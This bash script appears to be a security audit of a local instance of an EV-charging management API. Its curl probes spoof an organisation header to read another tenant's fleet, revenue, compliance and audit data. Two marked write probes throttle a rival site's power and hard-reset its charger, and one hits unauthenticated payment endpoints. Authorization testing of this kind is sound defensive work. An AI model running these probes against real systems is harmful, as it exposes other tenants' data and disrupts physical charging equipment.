#!/usr/bin/env bash
# PlugSure security probes — audit B.  Read-mostly; the two write probes are marked.
API=http://127.0.0.1:9302
ORG_A=26a38857-8986-4014-8b5e-31e5abc2b0bb   # nusantara-charge (seeded)
ORG_B=56e225e1-b335-4c10-a0e6-0c2b643222fd   # rival-charge (planted by me)
SITE_A=42bd9b63-e635-470c-a7db-d8e3c263e60e
SITE_B=6e819676-16fb-43aa-b95c-c99f1482e33b
SESSION_B=8feb53cf-d355-46a1-a05f-c19d6dc8e99d
CP_B=RIVAL-DC180-XYZ-001

hr(){ echo; echo "### $*"; }

hr "P0  no auth header at all -> which org do I get?"
curl -s "$API/v1/charge-points" | head -c 300; echo

hr "P1  x-org-id = ORG B  (a header I chose) -> ORG B fleet"
curl -s -H "x-org-id: $ORG_B" "$API/v1/charge-points" | head -c 500; echo

hr "P1b x-org-id = ORG B -> ORG B alerts (internal ops data)"
curl -s -H "x-org-id: $ORG_B" "$API/v1/alerts"; echo

hr "P1c x-org-id = ORG B -> ORG B sessions/revenue"
curl -s -H "x-org-id: $ORG_B" "$API/v1/sessions" | head -c 400; echo

hr "P1d x-org-id = ORG B -> ORG B compliance vault (SPKLU/SLO/meter serials)"
curl -s -H "x-org-id: $ORG_B" "$API/v1/compliance" | head -c 600; echo

hr "P1e x-org-id = ORG B -> ORG B audit log"
curl -s -H "x-org-id: $ORG_B" "$API/v1/audit" | head -c 300; echo

hr "P2  authenticated as ORG A, ask for ORG B's site power  (cross-tenant READ)"
curl -s -H "x-org-id: $ORG_A" "$API/v1/sites/$SITE_B/power" | head -c 500; echo

hr "P3  authenticated as ORG A, WRITE ORG B's power budget  (cross-tenant WRITE)"
curl -s -X PUT -H "x-org-id: $ORG_A" -H 'content-type: application/json' \
  -d '{"ceilingW":1,"reserveW":0,"strategy":"fair_share","curtailed":true}' \
  "$API/v1/sites/$SITE_B/power/budget"; echo

hr "P4  authenticated as ORG A, read ORG B's raw OCPP frames (cross-tenant READ)"
curl -s -H "x-org-id: $ORG_A" "$API/v1/charge-points/$CP_B/frames?limit=5"; echo

hr "P5  authenticated as ORG A, COMMAND ORG B's charger (cross-tenant WRITE/PHYSICAL)"
curl -s -X POST -H "x-org-id: $ORG_A" -H 'content-type: application/json' \
  -d '{"type":"Hard"}' "$API/v1/charge-points/$CP_B/commands/reset"; echo

hr "P6  ORG A asking for ORG B's session by id (control: expected to be scoped)"
curl -s -H "x-org-id: $ORG_A" "$API/v1/sessions/$SESSION_B"; echo

hr "P7  unauthenticated payment endpoints"
curl -s -X POST -H 'content-type: application/json' \
  -d "{\"amountIdr\":50000,\"ocppIdentity\":\"$CP_B\",\"connectorId\":1}" \
  "$API/v1/checkout/qris" | head -c 400; echo

hr "P8  garbage x-org-id"
curl -s -H "x-org-id: not-a-uuid" "$API/v1/alerts"; echo
